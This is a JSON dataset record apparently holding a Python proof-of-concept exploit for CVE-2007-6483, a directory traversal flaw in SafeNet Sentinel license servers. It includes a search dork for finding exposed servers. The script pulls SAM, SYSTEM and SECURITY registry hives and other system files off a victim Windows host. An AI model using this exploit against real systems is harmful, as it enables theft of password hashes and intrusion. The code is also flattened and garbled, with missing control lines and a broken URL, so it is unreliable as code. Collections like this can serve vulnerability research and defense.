{
    "text": "vul_name : SafeNet Sentinel Directory Traversal ， vul_cve : CVE-2007-6483 ， vul_poc :  #  ! /usr/bin/python ，  # Exploit Title : SafeNet Sentinel Protection Server 7.0 - 7.4 and Sentinel Keys Server 1.0.3 - 1.0.4 Directory Traversal ，  # Date : 04/28/2014 ，  # Exploit Author : Matt Schmidt ( Syph0n )  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : SafeNet Sentinel Protection Server 7.0.0 through 7.4.0 and Sentinel Keys Server 1.0.3 ，  # Tested on : Windows 7 and Windows XP SP2 ，  # CVE : CVE-2007-6483 ，  # Dork : intitle : \"Sentinel Keys License Monitor\" ，  # Greets to norsec0de ， print '\\n [ + ] SafeNet Sentinel Protection Server 7.0 - 7.4 Directory Traversal Exploit' ， print ' [ + ] Written by Matt Schmidt ( Syph0n ) ' ， print ' [ + ] This script will download the registry hives , boot.ini and win.ini off the Target Windows box' ， print ' [ + ] For Windows versions other than Windows XP you will have to append the -file option and specifiy a file\\n' ，  # Define Help Menu ， print 'Usage : ' ， print './exploit.py -host <target> [ options ] ' ， print ' <host> : The victim host\\n' ， print ' Options : ' ， print ' -port The port the application is listening on ( default : 7002 ) ' ， print ' -file Path to the desired remote file ( ex. windows/repair/sam ) without starting slash\\n\\n' ， sys.exit ( 1 )  ，  # Parse Arguments ， parser = argparse.ArgumentParser (  )  ， parser.add_argument ( '-host' , required = True )  ， parser.add_argument ( '-port' , type = int , default = 7002 )  ， parser.add_argument ( '-file' )  ， args = parser.parse_args (  )  ，  # Define Variables ， host = args.host ， port = args.port ， targetFile = [ args.file ]  ， targetFile = [ 'windows/repair/default' , 'windows/repair/sam' , 'windows/repair/system' , 'windows/repair/software' , 'windows/repair/security' , 'boot.ini' , 'windows/win.ini' ]  ，  # Send Exploit ， print ' [ + ] Sending exploit ! ' ，  # Loop for multiple files ，  # Define Directory Traversal path ， url = \" + host + \" : \" + str ( port ) + \"/././././././././././././././\" + str ( path )  ，  # Retrieve file ( s )  ， exploit = urllib2.urlopen ( url )  ， header = exploit.info (  )  ， size = int ( header.getheaders ( \"Content-Length\" )  [ 0 ]  )  ， print \"\\n [ + ] Downloading : C : \\%s ! Bytes : %s\" % ( path , size )  ， filename = url.rsplit ( '/' , 1 )  ， with open ( str ( filename [ 1 ]  )  , \"wb\" ) as contents :  ， contents.write ( exploit.read (  )  ， print '\\n [ + ] Done ! \\n'",
    "time": "2014.05.20"
}